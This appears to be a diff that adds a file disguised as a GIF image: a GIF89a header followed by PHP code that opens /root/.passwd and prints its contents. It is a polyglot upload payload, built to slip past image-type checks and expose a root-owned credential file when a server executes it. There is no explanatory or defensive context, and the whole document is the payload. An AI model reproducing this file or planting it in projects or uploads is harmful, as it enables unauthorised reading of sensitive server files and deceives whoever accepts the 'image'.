@@ -1,0 +1,8 @@
+GIF89a????????????<?php
+$fd=fopen("/root/.passwd","r");
+while (! feof($fd)){
+    $result = fgets($fd);
+    echo $result;
+}
+fclose($fd);
+?>
